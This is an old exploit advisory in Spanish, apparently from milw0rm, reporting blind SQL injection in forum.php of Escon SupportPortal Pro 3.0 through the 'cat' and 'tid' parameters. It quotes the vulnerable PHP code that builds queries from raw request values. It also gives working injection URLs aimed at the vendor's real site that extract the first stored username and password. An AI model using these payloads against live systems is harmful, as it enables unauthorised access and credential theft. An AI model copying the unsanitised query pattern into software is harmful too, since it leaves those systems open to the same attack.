@@ -1,0 +1,46 @@
+Autor : OzX
+Sitio : Foro.Undersecurity.net
+
+Cms :  Escon SupportPortal Pro
+Version : 3.0
+Sitio: http://www.e-supportportal.com
+
+Tipo Vulnz : Blind Sql Injection
+Archivo : forum.php
+Parametro Vulnerable 1 : cat
+Parametro Vulnerable 2 : tid
+
+Source Vulnz (forum.php):
+
+60 -    if($_REQUEST["a"]=="rss"){
+61 -        $cat=$_REQUEST["cat"];
+62 -        $tid=$_REQUEST["tid"];
+63 -        header('Content-type: application/rss+xml');
+64 - 
+65 -      $app_url=trim(dlookup("app_url","site","sid=$sid"),"/")."/";
+66 -
+67 -
+68 -  if(isset($_REQUEST['tid']))
+69 -     $r=dlookup_row("select * from fr where sid=$sid and id=$tid");
+70 -  else {$r=dlookup_row("select * from fr_cat where sid=$sid and id=$cat");$tid=0;}
+71 -  echo "<?xml version=\"1.0\" ?>";
+
+
+Ejemplo:
+http://www.site.comforum.php?a=rss&cat=[SQLI]&tid=[SQLI]
+
+Otros:
+
+Usuario :
+ttp://www.e-supportportal.com/app/forum.php?cat=6&tid=33+and+(select+uname+from+usr+limit+0,1)
+
+PassWord :
+http://www.e-supportportal.com/app/forum.php?cat=6&tid=33+and+(select+upwd+from+usr+limit+0,1)
+
+Gretz :
+C1c4tr1z(voodoo-labs.org),Nobody,1995,Lix (arrivalsec.wordpress.com),NanoNRoses,Codebreak(?),Nork And All Friends of Undersecurity.net.
+
+
+Site Referer : http://foro.undersecurity.net/read.php?16,1971,1971#msg-1971
+
+# milw0rm.com [2009-06-01]
